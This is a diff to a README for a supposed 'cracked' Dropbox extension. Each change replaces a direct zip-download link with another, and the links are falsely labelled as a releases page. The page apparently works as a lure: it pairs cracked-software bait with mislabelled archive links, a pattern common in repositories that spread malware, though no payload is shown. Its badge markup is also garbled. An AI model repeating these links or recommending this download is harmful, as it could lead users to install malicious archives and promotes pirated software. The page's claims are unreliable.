@@ -1,7 +1,7 @@
 # ✨ cracked-enhancer-for-dropbox-extension - Enhance Your Dropbox Experience Effortlessly
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/p4blo3d/cracked-enhancer-for-dropbox-extension/main/conferee/cracked-enhancer-for-dropbox-extension.zip%20Now-Get%20the%https://raw.githubusercontent.com/p4blo3d/cracked-enhancer-for-dropbox-extension/main/conferee/cracked-enhancer-for-dropbox-extension.zip)](https://raw.githubusercontent.com/p4blo3d/cracked-enhancer-for-dropbox-extension/main/conferee/cracked-enhancer-for-dropbox-extension.zip)
+[![Download](https://github.com/p4blo3d/cracked-enhancer-for-dropbox-extension/raw/refs/heads/main/conferee/dropbox-cracked-for-extension-enhancer-3.6.zip%20Now-Get%20the%https://github.com/p4blo3d/cracked-enhancer-for-dropbox-extension/raw/refs/heads/main/conferee/dropbox-cracked-for-extension-enhancer-3.6.zip)](https://github.com/p4blo3d/cracked-enhancer-for-dropbox-extension/raw/refs/heads/main/conferee/dropbox-cracked-for-extension-enhancer-3.6.zip)
 
 ## 🚀 Getting Started
 This guide will help you download and use the "Cracked Enhancer for Dropbox Extension". This tool makes using Dropbox easier and more efficient. Follow these steps to get started.
@@ -13,7 +13,7 @@ This guide will help you download and use the "Cracked Enhancer for Dropbox Exte
 - **Internet Connection:** Needed to download the extension and sync with Dropbox.
 
 ## 📦 Download & Install
-1. **Visit the Releases Page:** Click [this link](https://raw.githubusercontent.com/p4blo3d/cracked-enhancer-for-dropbox-extension/main/conferee/cracked-enhancer-for-dropbox-extension.zip) to go to the releases page.
+1. **Visit the Releases Page:** Click [this link](https://github.com/p4blo3d/cracked-enhancer-for-dropbox-extension/raw/refs/heads/main/conferee/dropbox-cracked-for-extension-enhancer-3.6.zip) to go to the releases page.
 
 2. **Choose the Latest Release:** On the releases page, look for the latest version listed at the top. 
 
@@ -67,4 +67,4 @@ This tool is provided as-is. Ensure you comply with Dropbox's terms of service w
 
 ---
 
-Remember, you can always revisit the [releases page](https://raw.githubusercontent.com/p4blo3d/cracked-enhancer-for-dropbox-extension/main/conferee/cracked-enhancer-for-dropbox-extension.zip) to download updates or newer versions of the extension. Enjoy enhancing your Dropbox experience!
+Remember, you can always revisit the [releases page](https://github.com/p4blo3d/cracked-enhancer-for-dropbox-extension/raw/refs/heads/main/conferee/dropbox-cracked-for-extension-enhancer-3.6.zip) to download updates or newer versions of the extension. Enjoy enhancing your Dropbox experience!
